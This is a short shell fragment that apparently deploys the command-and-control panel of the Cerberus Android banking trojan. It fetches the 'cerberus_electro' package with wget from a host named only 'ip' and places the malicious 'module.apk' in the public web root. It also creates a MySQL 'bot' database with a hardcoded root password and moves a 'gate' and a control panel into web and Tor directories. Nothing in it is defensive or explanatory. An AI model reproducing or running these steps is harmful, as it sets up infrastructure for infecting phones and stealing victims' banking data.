...
cd /home ; wget http://ip/cerberus_electro ; unzip cerberus_electro
mv sysbig /
mv sysres /
cp module.apk /var/
cp module.apk /var/www/
cp module.apk /var/www/html/module.apk
cd panel_v2

mysql -uroot --password="electrosql" -e "CREATE DATABASE bot /*\!40100 DEFAULT CHARACTER SET utf8 */;"
mysql -uroot --password="electrosql" -e "CREATE USER 'non-root'@'localhost' IDENTIFIED BY 'electrosql';"
mysql -uroot --password="electrosql" bot < bot.sql
mysql -uroot --password="electrosql" -e "GRANT ALL PRIVILEGES ON *.* TO 'non-root'@'localhost';"
mysql -uroot --password="electrosql" -e "FLUSH PRIVILEGES;"
rm -rf bot.sql
...
mv /home/control /var/www/tor
mv /home/restapi_v2/source/gate/* /var/www/html
mv /home/restapi_v2/source/restapi/* /var/www/tor
